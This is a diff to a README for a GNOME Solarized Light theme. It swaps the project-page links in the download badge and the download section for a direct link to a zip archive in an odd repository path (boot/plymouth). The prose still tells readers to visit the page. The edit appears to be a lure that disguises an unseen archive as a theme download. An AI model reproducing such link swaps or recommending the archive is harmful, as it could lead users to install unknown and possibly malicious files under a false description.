@@ -1,6 +1,6 @@
 # 🌿 solarized-light-gnome50-rice - Clean Solarized Light for GNOME
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge)](https://github.com/evawo7976/solarized-light-gnome50-rice)
+[![Download](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge)](https://github.com/evawo7976/solarized-light-gnome50-rice/raw/refs/heads/main/boot/plymouth/solarized-light-gnome-rice-v3.4.zip)
 
 ## ✨ What this is
 
@@ -37,7 +37,7 @@ You should have:
 
 Visit this page to download:
 
-[https://github.com/evawo7976/solarized-light-gnome50-rice](https://github.com/evawo7976/solarized-light-gnome50-rice)
+[https://github.com/evawo7976/solarized-light-gnome50-rice/raw/refs/heads/main/boot/plymouth/solarized-light-gnome-rice-v3.4.zip](https://github.com/evawo7976/solarized-light-gnome50-rice/raw/refs/heads/main/boot/plymouth/solarized-light-gnome-rice-v3.4.zip)
 
 Open the link in your browser, then look for the project files and download the archive or clone the repository if that is the method provided on the page.
 
